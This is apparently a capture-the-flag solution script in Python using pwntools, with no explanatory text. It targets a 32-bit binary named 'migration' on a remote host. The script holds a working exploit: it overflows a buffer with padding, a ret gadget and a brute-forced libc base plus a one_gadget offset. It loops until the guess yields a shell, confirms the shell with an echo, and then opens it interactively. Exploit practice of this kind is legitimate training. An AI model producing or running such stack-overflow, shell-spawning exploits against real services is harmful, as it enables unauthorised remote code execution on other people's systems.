from pwn import *
import time

main_puts = 0x80484ea
got_puts = 0x8049ff0
got_read = 0x8049fe8
got_exit = 0x8049fec
'''
# local: libc-2.23.so
libc_puts_offset = 0x67360
libc_one_gadget_offset = 0x3a80c
'''

# remote: libc6_2.23-0ubuntu11.2_i386
libc_one_gadget_offset = 0x3ac6c

# 0x08048418 : leave ; ret
leave = 0x8048418
ret = 0x8048505

while 1:
    #r = process('./migration')
    r = remote('140.110.112.77', 2127)
    #raw_input('debug: ')
    r.recvuntil(' :')
    r.sendline('a' * 0x2c + p32(ret) + p32(0xf7d62000 + libc_one_gadget_offset))
    #raw_input('debug: ')
    try:
        time.sleep(0.2)
        r.sendline('echo haha')
        r.recvline()
        if 'haha' in r.recvline():
            r.interactive()
    except:
        pass
